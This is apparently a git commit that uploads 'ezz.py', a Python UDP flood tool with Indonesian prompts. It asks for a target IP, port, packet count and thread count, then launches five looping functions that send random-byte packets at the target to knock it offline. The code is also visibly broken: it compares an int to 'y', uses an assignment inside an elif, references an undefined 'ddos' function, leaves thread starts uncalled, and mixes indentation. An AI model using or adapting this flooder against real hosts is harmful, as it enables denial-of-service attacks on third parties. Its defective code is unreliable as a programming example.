39b03795e0bbb2b8b7d8238f00073b5f1c9e5b3d
Lynzzx999 <103431068+Lynzzx999@users.noreply.github.com>
2022-05-21 18:32:04 +0700

    Add files via upload

---
+++ ezz.py
@@ -0,0 +1,105 @@
+###################################################################################
+# Tools Created By BimzzTheNextGeneration#1103
+# Please Don't Remove Credit | Tolong Jangan Hapus Credit
+###################################################################################
+# IMPORT MODULE
+import os, sys, socket, threading, random
+###################################################################################
+# CLEAR
+def clear():
+	os.system('cls' if os.name=='nt' else 'clear')
+###################################################################################
+# MAIN MENU 
+clear()
+ip = str(input("\033[94m╔═══\033[91m[ Masukkan IP-nya ] •\n\033[94m╠══>\033[0m "))
+port = int(input("\033[94m╚═══\033[91m[ Masukkan PORT-nya ] •\n\033[94m╠══>\033[0m "))
+choice = int(input("\033[94m╚═══\033[91m[ Attack? (y/n) ] •\n\033[94m╠══>\033[0m "))
+times = int(input("\033[94m╚═══\033[91m[ Masukkan PACKETs-nya ] •\n\033[94m╠══>\033[0m "))
+threads = int(input("\033[94m╚═══\033[91m[ Masukkan THREADs-nya ] •\n\033[94m╠══>\033[0m "))
+clear()
+print("\033[94m")
+###################################################################################
+# ATTACK SENT
+
+def attack():
+	data = random._urandom(1025)
+	i = random.choice(("[ # ]", "[ ! ]", "[ * ]", "[ $ ]", "[ • ]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Attack by bimzzx to ip > {} and port > {} ?!!".format(ip, port))
+		except:
+			print("[ Down ] • Request time out on ip > {} and port > {}".format(ip, port))
+
+def attack2():
+	data = random._urandom(1800)
+	i = random.choice(("[ # ]", "[ ! ]", "[ * ]", "[ $ ]", "[ • ]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Attack by bimzzx to ip > {} and port > {} ?!!".format(ip, port))
+		except:
+			print("[ Down ] • Request time out on ip > {} and port > {}".format(ip, port))
+
+def attack3():
+	data = random._urandom(1080)
+	i = random.choice(("[ # ]", "[ ! ]", "[ * ]", "[ $ ]", "[ • ]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Attack by bimzzx to ip > {} and port > {} ?!!".format(ip, port))
+		except:
+			print("[ Down ] • Request time out on ip > {} and port > {}".format(ip, port))
+
+def attack4():
+	data = random._urandom(999)
+	i = random.choice(("[ # ]", "[ ! ]", "[ * ]", "[ $ ]", "[ • ]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Attack by bimzzx to ip > {} and port > {} ?!!".format(ip, port))
+		except:
+			print("[ Down ] • Request time out on ip > {} and port > {}".format(ip, port))
+
+def attack5():
+	data = random._urandom(818)
+	i = random.choice(("[ # ]", "[ ! ]", "[ * ]", "[ $ ]", "[ • ]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Attack by bimzzx to ip > {} and port > {} ?!!".format(ip, port))
+		except:
+			print("[ Down ] • Request time out on ip > {} and port > {}".format(ip, port))
+
+###################################################################################
+# START DDOS
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = ddos)
+		th.start()
+		th = threading.Thread(target = attack2)
+		th.start()
+		th = threading.Thread(target = attack3)
+		th.start
+		th = threading.Thread(target = attack4)
+	    th.start
+	    th = threading.Thread(target = attack5)
+		th.start
+	elif choice = 'n':
+		print("\033[91m[ Bimzzx ] • CloseTheProgram")
+		pass
